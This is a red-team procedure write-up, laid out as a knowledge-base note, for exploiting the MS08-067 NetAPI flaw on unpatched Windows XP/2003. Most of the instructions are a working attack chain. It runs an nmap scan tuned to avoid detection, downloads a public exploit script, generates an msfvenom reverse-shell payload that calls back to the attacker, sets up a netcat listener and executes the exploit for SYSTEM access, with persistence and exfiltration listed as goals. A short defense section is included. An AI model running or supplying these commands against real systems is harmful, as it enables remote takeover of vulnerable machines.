---
type: procedure
verified: true
submitted: false
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
sub_techniques: []
tags:
  - '[[tags/EoP - Common Vulnerabilities and Exposure]]'
  - '[[tags/MS08-067 (NetAPI)]]'
  - '[[tags/Windows - Privilege Escalation]]'
commands:
  - '[[commands/nmap-scan-for-ms08-067-vulnerability]]'
  - '[[commands/download-ms08-067-exploit-script]]'
  - '[[commands/generate-python-shellcode-for-ms08-067]]'
  - '[[commands/run-python-ms08-067-exploit]]'
platforms:
  - Windows
tools:
  - '[[tools/Nmap]]'
  - '[[tools/Metasploit]]'
validated: true
---

# MS08-067 NetAPI Privilege Escalation

## Summary

This procedure exploits the MS08-067 vulnerability in the Windows Server service (NetAPI) to execute arbitrary code and achieve privilege escalation to SYSTEM level on vulnerable Windows systems such as XP SP3 or Server 2003. It uses a standalone Python exploit script combined with a custom reverse shell payload generated via msfvenom, providing a method for remote code execution without relying on Metasploit's interactive console.

## Description

MS08-067, also known as the NetAPI vulnerability, affects the Server service in Windows, allowing remote attackers to send crafted RPC requests over SMB (ports 139 or 445) to trigger a buffer overflow and execute code with SYSTEM privileges. This was a widespread issue exploited by malware like Conficker. The procedure assumes network access to the target and focuses on confirming vulnerability, preparing a custom payload, modifying the exploit script, and executing it to establish a reverse shell. It targets unpatched systems and is suitable for red team engagements simulating legacy environment attacks. Success results in full system control, enabling further post-exploitation.

## Requirements

1. Kali Linux or equivalent attacker machine with Python 2/3, Nmap, wget, and Metasploit installed.
2. Network connectivity to the target on TCP port 445 (or 139).
3. Target is a vulnerable Windows version (e.g., XP SP0-SP3, 2003 SP0-SP1) with NetAPI/Server service enabled and unpatched.
4. Attacker IP reachable from target for reverse shell callback.
5. Listener setup (e.g., netcat) on attacker machine.

## Defense

- Apply Microsoft Security Bulletin MS08-067 patch to all Windows systems.
- Disable SMBv1 and unnecessary file/printer sharing services if not required.
- Implement firewalls to block inbound SMB traffic (ports 139/445) from untrusted networks.
- Monitor for anomalous RPC/SMB traffic and enable Windows event logging for failed authentications or service crashes.

## Objectives

1. Confirm the target is vulnerable to MS08-067 exploitation.
2. Generate and insert a custom reverse shell payload into the exploit script.
3. Execute the exploit to gain a SYSTEM-level reverse shell on the target.
4. Establish persistent access for further actions like data exfiltration or lateral movement.

## Instructions

### Step 1: Verify Vulnerability with Nmap

**Context**: Before exploitation, scan the target to confirm exposure to MS08-067, ensuring the Server service is running and vulnerable. This step uses Nmap's NSE script to detect the specific OS version and vulnerability status without alerting the target excessively.

**Command** ([[commands/nmap-scan-for-ms08-067-vulnerability]]):
```bash
nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067 $_TARGET_IP
```

> Run this from the attacker machine. The --max-hostgroup limits parallel scans to evade detection. If vulnerable, the output will detail the OS and confirm "VULNERABLE" status; otherwise, abort the procedure.

### Step 2: Download the Exploit Script

**Context**: Retrieve the Python-based MS08-067 exploit script from a trusted repository. This script handles the crafted RPC packet transmission and shellcode execution.

**Command** ([[commands/download-ms08-067-exploit-script]]):
```bash
wget https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py -O ms08-067.py
```

> This downloads the script to your current directory. Verify the file integrity if possible (e.g., check MD5 against known good hash). The script supports multiple Windows versions via a version parameter.

### Step 3: Generate Shellcode Payload

**Context**: Create a Python-formatted reverse shell payload using msfvenom. This shellcode will be injected into the target process upon successful overflow, connecting back to the attacker.

**Command** ([[commands/generate-python-shellcode-for-ms08-067]]):
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$_LHOST LPORT=$_LPORT EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```

> The -b flag avoids bad characters that could break the SMB buffer. Copy the output line starting with "shellcode =" (the byte array). Start a listener (e.g., nc -lvnp $_LPORT) before proceeding.

### Step 4: Insert Shellcode into Exploit Script

**Context**: Modify the downloaded script to include the custom shellcode, enabling the reverse shell functionality. This step requires manual editing as the script uses a placeholder for the payload.

Instructions: Open ms08-067.py in a text editor (e.g., vim or nano). Locate the shellcode definition (typically near the top, like shellcode = b'\xXX\xYY...'). Replace it with the shellcode generated in Step 3. Save the file. If the target has NX (DEP), select a version parameter that accounts for it (e.g., 5 for XP SP3 French NX).

> No command is needed for editing; ensure the byte escapes match exactly to avoid crashes.

### Step 5: Execute the Exploit

**Context**: Launch the modified script against the target, specifying the OS version and port. Success triggers the buffer overflow, executes the shellcode, and opens a reverse shell.

**Command** ([[commands/run-python-ms08-067-exploit]]):
```bash
python ms08-067.py $_TARGET_IP $_VERSION $_PORT
```

> Use $_VERSION based on Nmap results: 1 (XP SP0/SP1), 2 (2000), 3 (2003 SP0), 4 (2003 SP1), 5 (XP SP3 French NX), 6 (XP SP3 English NX), 7 (XP SP3 English AlwaysOn NX). Default port is 445; use 139 if 445 is filtered. Monitor the listener for incoming connection.

## Expected Output

Successful exploitation results in a reverse shell connecting to the attacker's listener, providing a command prompt with SYSTEM privileges (verify with 'whoami'). The script may output progress like "Sending exploit..." followed by no errors. Failure indicators include connection refused, segmentation faults, or no callback.
